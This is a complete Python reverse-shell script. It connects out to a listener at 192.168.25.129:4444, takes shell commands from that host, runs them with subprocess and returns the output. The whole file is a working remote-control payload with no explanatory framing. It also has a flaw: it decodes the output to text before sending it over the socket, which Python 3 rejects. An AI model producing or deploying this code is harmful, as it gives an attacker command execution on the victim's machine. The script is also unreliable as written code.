#!/usr/bin/env python

import socket
import subprocess

def execute_system_command(command):
    command_str = command.decode("utf-8")
    command_list = command_str.split(" ") 
    
    try:
        result = subprocess.check_output(command_list)
        return result
    except subprocess.CalledProcessError as e:
        return str(e).encode("utf-8")

# Set up the socket connection
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("192.168.25.129", 4444))

while True:
    command = sock.recv(1024)  
    
    if command.decode("utf-8").lower() == "exit":  
        break  
    command_result = execute_system_command(command) 

    sock.send(command_result.decode('utf-8'))  
sock.close()  